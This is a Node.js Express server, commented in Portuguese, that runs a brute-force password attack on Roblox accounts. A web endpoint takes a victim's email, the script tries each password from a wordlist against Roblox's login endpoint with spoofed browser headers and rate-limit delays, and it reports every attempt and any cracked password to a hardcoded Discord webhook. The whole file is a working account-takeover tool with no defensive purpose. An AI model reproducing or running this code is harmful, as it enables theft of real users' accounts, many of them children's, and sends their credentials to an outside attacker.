const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// URL DO WEBHOOK DO DISCORD
const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";

app.use(express.json());
app.use(express.static('.'));

// Função para enviar mensagem no Discord via Webhook
async function sendDiscordMessage(content) {
    try {
        await axios.post(WEBHOOK_URL, {
            content: content,
            username: "Roblox Brute Forcer",
            avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg'
        });
        console.log("✅ Mensagem enviada ao Discord!");
    } catch (e) {
        console.error("❌ Erro ao enviar msg no Discord:", e.message);
    }
}

// Função para tentar Login no Roblox (Método Atualizado com Debug)
async function tryRobloxLogin(email, password, isFirstTry) {
    const baseUrl = "https://www.roblox.com";
    
    // Usar a API moderna de login do Roblox
    const loginUrl = "https://www.roblox.com/mobileapi/userinfo"; // Esta API é mais simples para teste
    // Ou a API clássica: "https://www.roblox.com/users/login"
    
    // Vamos tentar a API clássica com headers mais completos
    const robloxClient = axios.create({
        baseURL: baseUrl,
        timeout: 10000,
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.roblox.com/login'
        },
        withCredentials: true // Importante para cookies
    });

    try {
        // 1. Pegar Cookies iniciais (Essencial para o Roblox)
        const getResponse = await robloxClient.get('/');
        
        // 2. Tentar fazer Login
        // Nota: O Roblox às vezes exige que o email tenha um prefixo ou que se use o Username
        const response = await robloxClient.post('/users/login', {
            username: email,
            password: password
        }, {
            headers: { 'Content-Type': 'application/json' },
            validateStatus: status => status < 500 // Aceitar 200, 400, 401, etc.
        });

        const data = response.data;
        
        // Se for a primeira tentativa, enviar o JSON COMPLETO no Discord para debug
        if (isFirstTry) {
            const debugMsg = `**🐛 DEBUG DA RESPOSTA DO ROBLOX:**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`\n**Status Code:** ${response.status}`;
            await sendDiscordMessage(debugMsg);
        }

        // Verificar se houve sucesso
        // O Roblox retorna { id: number, username: string } em sucesso
        if (data.id && typeof data.id === 'number') {
            return {
                success: true,
                username: data.username,
                userId: data.id,
                error: "Sucesso"
            };
        } 
        // Às vezes o erro vem em data.error ou data.errors[0].message
        else if (data.error) {
            return {
                success: false,
                username: email,
                userId: null,
                error: data.error
            };
        }
        else if (data.errors && data.errors[0]) {
            return {
                success: false,
                username: email,
                userId: null,
                error: data.errors[0].message || "Erro Desconhecido"
            };
        }
        else {
            // Se nada bater, retornar o JSON todo como erro
            return {
                success: false,
                username: email,
                userId: null,
                error: "Resposta Estranha: " + JSON.stringify(data)
            };
        }

    } catch (error) {
        return {
            success: false,
            username: email,
            userId: null,
            error: "Exceção: " + (error.message || "Timeout/Conexão")
        };
    }
}

// FUNÇÃO PRINCIPAL: Ataque de Força Bruta
async function startBruteForce(email) {
    // 1. Ler o ficheiro de senhas
    let passwords = [];
    try {
        const rawData = fs.readFileSync(path.join(__dirname, 'senhas.txt'), 'utf-8');
        passwords = rawData.split('\n').map(p => p.trim()).filter(p => p.length > 0);
    } catch (e) {
        console.error("Erro ao ler senhas.txt:", e.message);
        await sendDiscordMessage(`**❌ ERRO NO ARQUIVO:** senhas.txt não encontrado ou vazio!`);
        return;
    }

    if (passwords.length === 0) {
        await sendDiscordMessage(`**❌ ERRO:** A lista de senhas está vazia!`);
        return;
    }

    console.log(`Iniciando ataque em: ${email} com ${passwords.length} senhas...`);
    await sendDiscordMessage(`**🚀 INÍCIO DO ATAQUE**\n**Alvo:** ${email}\n**Total de Senhas:** ${passwords.length}\n*Vou enviar o DEBUG da primeira tentativa no Discord...*`);

    let found = false;

    // 2. Testar cada senha
    for (const password of passwords) {
        if (found) break;

        // Só faz debug detalhado na primeira tentativa para não encher o Discord
        const isFirstTry = true; 

        const result = await tryRobloxLogin(email, password, isFirstTry);

        if (result.success) {
            found = true;
            const msg = `**✅ CONTA ENCONTRADA!**\n**Email:** ${email}\n**Senha Correta:** ${password}\n**Username:** ${result.username}\n**ID:** ${result.id}`;
            await sendDiscordMessage(msg);
            console.log("ENCONTRADA:", password);
        } else {
            // Enviar erro resumido
            const errorMsg = `❌ **Tentativa Falhada**\n**Senha:** ${password}\n**Erro:** ${result.error}`;
            await sendDiscordMessage(errorMsg);
        }

        // Pausa maior para evitar o "Rate Limit" do Roblox
        await new Promise(r => setTimeout(r, 3000)); 
    }

    if (!found) {
        await sendDiscordMessage(`**❌ ATAQUE FINALIZADO (Sem Sucesso)**\n**Alvo:** ${email}\n**Senhas Testadas:** ${passwords.length}`);
    }
}

// ENDPOINT: Receber o Email do Site e Iniciar o Ataque
app.post('/start-brute-force', async (req, res) => {
    const { email } = req.body;

    if (!email || !email.includes('@')) {
        return res.json({ success: false, error: "Email inválido" });
    }

    // Iniciar o ataque em "background"
    startBruteForce(email);

    // Retornar resposta imediata ao site
    return res.json({ success: true, message: "Ataque iniciado! Aguarde as notificações no Discord." });
});

// INICIAR SERVIDOR
app.listen(port, () => {
    console.log(`✅ Servidor rodando na porta ${port}`);
});
